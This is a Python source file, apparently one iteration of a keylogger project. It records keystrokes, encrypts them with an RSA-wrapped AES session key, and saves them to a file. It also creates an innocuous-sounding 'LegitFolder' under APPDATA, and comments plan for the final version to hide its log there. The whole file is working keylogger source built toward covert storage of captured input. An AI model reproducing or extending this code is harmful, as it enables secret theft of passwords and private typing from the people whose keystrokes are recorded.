# Iteration 4-1, this file logs keystrokes, encrypts them, then saves to App Data

from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import keyboard
import os

directory = os.path.join(os.getenv("APPDATA"), "LegitFolder")

# Make the specified directory. If it doesn't exist, 
try:
    os.mkdir(directory)
except FileExistsError:
    pass

# Name of the log file
log_path = os.path.join(directory, "encryptedtext.bin")

# Log keystrokes into a list
keystrokes_list = []
with open(log_path, "w") as f:
    print('Starting record! Press ESC to exit!')
    events = keyboard.record(until='escape')
    
    for event in events:
        if event.event_type == keyboard.KEY_DOWN:
            keystrokes_list.append(event.name)


# The following code is taken from the PyCryptoDome docs: https://www.pycryptodome.org/src/examples#generate-an-rsa-key

recipient_key = RSA.import_key(open("receiver.pem").read())
session_key = get_random_bytes(16)

# Encrypt the session key with the public RSA key
cipher_rsa = PKCS1_OAEP.new(recipient_key)
enc_session_key = cipher_rsa.encrypt(session_key)

# Encrypt the data with the AES session key
cipher_aes = AES.new(session_key, AES.MODE_EAX)
ciphertext, tag = cipher_aes.encrypt_and_digest(" ".join(keystrokes_list).encode('utf-8'))

# Currently, this creates a file in the current directory for demonstration purposes,
# in the final product, this will write a file into App Data as demonstrated in Iteration 3
with open('encrypted_text.bin', "wb") as f:
    f.write(enc_session_key)
    f.write(cipher_aes.nonce)
    f.write(tag)
    f.write(ciphertext)